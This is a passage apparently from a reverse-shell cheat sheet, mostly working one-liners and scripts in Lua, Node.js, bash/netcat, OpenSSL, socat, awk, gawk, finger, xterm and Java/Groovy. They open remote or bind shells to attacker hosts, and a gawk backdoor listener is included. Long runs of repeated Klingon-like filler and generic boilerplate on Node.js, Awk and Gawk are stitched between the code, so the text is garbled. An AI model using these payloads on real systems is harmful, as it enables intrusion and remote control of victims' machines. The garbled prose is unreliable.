'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e' vItlhutlh. 'e' vItlhutlh 'e'
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS

### Introduction

Node.js is an open-source, cross-platform JavaScript runtime environment that allows developers to build server-side and networking applications. It uses an event-driven, non-blocking I/O model that makes it lightweight and efficient.

### Installation

To install Node.js on a Linux system, you can use the package manager of your distribution. For example, on Ubuntu, you can run the following command:

```bash
sudo apt-get install nodejs
```

### Running Node.js Scripts

To run a Node.js script, you can use the `node` command followed by the name of the script file. For example:

```bash
node script.js
```

### NPM (Node Package Manager)

NPM is the default package manager for Node.js. It allows you to easily install, manage, and update packages and dependencies for your Node.js projects.

To install a package using NPM, you can use the `npm install` command followed by the name of the package. For example:

```bash
npm install express
```

### Common Node.js Modules

Node.js has a rich ecosystem of modules that can be used to extend its functionality. Some of the most commonly used modules include:

- `http`: Provides functionality for creating HTTP servers and clients.
- `fs`: Provides file system-related operations.
- `path`: Provides utilities for working with file and directory paths.
- `crypto`: Provides cryptographic functionality.
- `util`: Provides various utility functions.

### Conclusion

Node.js is a powerful runtime environment for building server-side and networking applications. With its event-driven, non-blocking I/O model and rich ecosystem of modules, it offers developers a flexible and efficient platform for their projects.
```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## OpenSSL

**The Attacker (Kali)**

**Qa'Hom (Kali)**
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
### The Victim

The victim refers to the target of a hacking attack. In the context of penetration testing, the victim is the system or network that is being tested for vulnerabilities. It is important for a hacker to understand the victim's environment, including the operating system, software versions, and network configuration. This information helps the hacker identify potential entry points and exploit vulnerabilities. By gaining unauthorized access to the victim's system or network, the hacker can carry out various malicious activities, such as stealing sensitive data, disrupting services, or gaining control over the victim's resources.
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### **Bind shell**

A bind shell is a type of shell that listens for incoming connections on a specific port. It allows an attacker to gain remote access to a target system by establishing a connection from their own machine. Socat is a versatile tool that can be used to create a bind shell on a Linux system.

To create a bind shell using Socat, follow these steps:

1. Download the Socat binary from the [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries) repository.

2. Transfer the Socat binary to the target Linux system.

3. Set the permissions of the Socat binary to make it executable: `chmod +x socat`.

4. Open a terminal on the target system and navigate to the directory where the Socat binary is located.

5. Run the following command to create a bind shell on a specific port (replace `<port>` with the desired port number): `./socat TCP-LISTEN:<port> EXEC:/bin/bash`.

6. The bind shell is now active and listening for incoming connections on the specified port.

7. From your own machine, use a tool like Netcat to establish a connection to the target system's IP address and the port specified in the bind shell command: `nc <target_ip> <port>`.

8. Once the connection is established, you will have remote access to the target system's shell.

It is important to note that creating a bind shell without proper authorization is illegal and unethical. This information is provided for educational purposes only.
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```
### Qa'Hom 'ej Qa'Hom

#### Reverse shell

A reverse shell is a technique used in hacking to establish a connection between the attacker's machine and the target machine. In a reverse shell scenario, the target machine initiates the connection to the attacker's machine, allowing the attacker to gain remote access and control over the target.

To create a reverse shell, the attacker typically exploits a vulnerability or misconfiguration on the target machine, allowing them to execute arbitrary commands. Once the attacker has gained control, they can use various methods to establish a reverse shell connection.

One common method is to use a command-line tool like `netcat` or `nc` to listen for incoming connections on a specific port. The attacker sets up a listener on their machine and waits for the target machine to connect. Once the connection is established, the attacker can interact with the target machine's shell remotely.

Another method involves using a scripting language like Python or Perl to create a reverse shell payload. The payload is then executed on the target machine, establishing a connection back to the attacker's machine.

Regardless of the method used, it is important for the attacker to ensure that the reverse shell connection is secure and encrypted to prevent detection and interception by network security measures.

#### Qa'Hom 'ej Qa'Hom

#### Qa'Hom 'ej Qa'Hom

Qa'Hom 'ej Qa'Hom Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch 'ej Hoch
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk

### Description

Awk is a versatile programming language that is commonly used for text processing and data manipulation. It provides a set of powerful tools for searching, filtering, and transforming text files. Awk operates on a line-by-line basis, processing each line and performing specified actions based on patterns and actions defined by the user.

### Syntax

The basic syntax of an Awk command is as follows:

```bash
awk 'pattern { action }' file
```

- `pattern` specifies the condition that must be met for the action to be executed.
- `action` defines the action to be performed when the pattern is matched.
- `file` is the input file to be processed by Awk.

### Examples

1. Print lines containing the word "hack" in a file:

```bash
awk '/hack/ { print }' file.txt
```

2. Print the second field of each line in a file:

```bash
awk '{ print $2 }' file.txt
```

3. Calculate the sum of numbers in a file:

```bash
awk '{ sum += $1 } END { print sum }' file.txt
```

### Useful Options

- `-F` specifies the field separator. For example, `-F":"` sets the field separator to a colon.
- `-v` allows you to define variables within the Awk command.
- `-f` specifies a file containing Awk commands to be executed.

### Additional Resources

- [Awk - Wikipedia](https://en.wikipedia.org/wiki/Awk)
- [Awk Tutorial](https://www.tutorialspoint.com/awk/index.htm)
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
### QaH

**QaHwI'**
```bash
while true; do nc -l 79; done
```
**QaStaHvIS**:
QaStaHvIS vItlhutlh. ngeD enter vItlhutlh je CTRL+D vItlhutlh (STDIN jImej).
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk

### Description

Gawk is a powerful text processing tool that allows you to manipulate and analyze data files. It is particularly useful for extracting specific information from large datasets and performing complex operations on the data.

### Basic Usage

To use Gawk, you need to have it installed on your Linux system. You can check if it is installed by running the following command:

```
gawk --version
```

If Gawk is not installed, you can install it using the package manager for your Linux distribution. For example, on Ubuntu, you can use the following command:

```
sudo apt-get install gawk
```

Once Gawk is installed, you can use it to process text files by running the following command:

```
gawk 'pattern { action }' file.txt
```

In this command, `pattern` is a regular expression that specifies the lines you want to match, and `action` is the code that is executed for each matched line. The `file.txt` parameter is the name of the file you want to process.

### Examples

Here are some examples of how you can use Gawk:

- Print all lines that contain the word "error" in a file:

```
gawk '/error/ { print }' file.txt
```

- Print the second field of each line in a file:

```
gawk '{ print $2 }' file.txt
```

- Calculate the sum of the numbers in the third column of a CSV file:

```
gawk -F ',' '{ sum += $3 } END { print sum }' file.csv
```

### Conclusion

Gawk is a versatile tool for text processing and data manipulation. By using its powerful features, you can extract and analyze data from files with ease.
```bash
#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd> "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |& Service
Service |& getline cmd
if (cmd) {
while ((cmd |& getline) > 0)
print $0 |& Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
```
## Xterm

qaStaHvIS 6001 portDaq lo'laHbe'chugh, lo'laHbe'chugh qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaStaHvIS qaSt
```bash
xterm -display 10.0.0.1:1
```
To catch the reverse shell you can use (which will listen in port 6001):

```
tlhIngan Hol:
ghItlh:
```

```
HTML:
<pre>
tlhIngan Hol:
ghItlh:
</pre>
```
```bash
# Authorize host
xhost +targetip
# Listen
Xnest :1
```
## Groovy

by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOTE: Java reverse shell also work for Groovy

## tlhIngan Hol

by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) Qap Java reverse shell 'oH Groovy Daq.
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## References
* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
* [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Find vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems. [**Try it for free**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) today.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
